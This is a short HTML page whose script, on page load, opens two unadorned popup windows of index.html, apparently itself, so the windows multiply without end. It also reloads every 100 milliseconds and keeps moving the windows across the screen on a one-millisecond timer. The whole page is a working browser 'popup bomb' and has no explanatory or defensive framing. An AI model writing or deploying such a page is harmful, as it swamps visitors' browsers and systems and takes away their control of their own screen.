<!DOCTYPE html>
<body onload="procreate()">
	<script>
	    var w1, w2;
	    w = screen.width, h = screen.height;
	    rx1 = Math.floor(Math.random() * w);
	    ry1 = Math.floor(Math.random() * h);
	    rx2 = Math.floor(Math.random() * w);
	    ry2 = Math.floor(Math.random() * h);
	    rx3 = Math.floor(Math.random() * w);
	    ry3 = Math.floor(Math.random() * h);
	    setInterval(moveWin, 1);
	    
    function procreate() {
        wopen("200", "index.html", "200", "1");
        setTimeout("location.reload(true);", 100);
    }

    function wopen(o, t, n, e) {
    	(e = 1) && (n = Math.floor(200 * Math.random()), o = Math.floor(200 * Math.random())), wleft = screen.width - o, wtop = screen.height - n, wleft < 0 && (wleft = 0), wtop < 0 && (n = screen.height, wtop = 0), wtop > 0 && (wtop = Math.floor(Math.random() * wtop)), wleft > 0 && (wleft = Math.floor(Math.random() * wleft));
    	w1 = window.open(t, "_blank", "width=" + o + ",height=" + n + ",left=" + wleft + ",top=" + wtop + ",menubar=no,status=no,toolbar=no,resizable=no");
    	w2 = window.open(t, "_blank", "width=" + o + ",height=" + n + ",left=" + wleft + ",top=" + wtop + ",menubar=no,status=no,toolbar=no,resizable=no");
    	w1.focus(), w2.focus();
    }

    function moveWin() {
        moveTo(rx3,ry3);
        w1.moveTo(rx1 += 5, ry1 -= 5);
        w2.moveTo(rx2 -= 5, ry2 += 5);
    }
	</script>

</body>

</html>
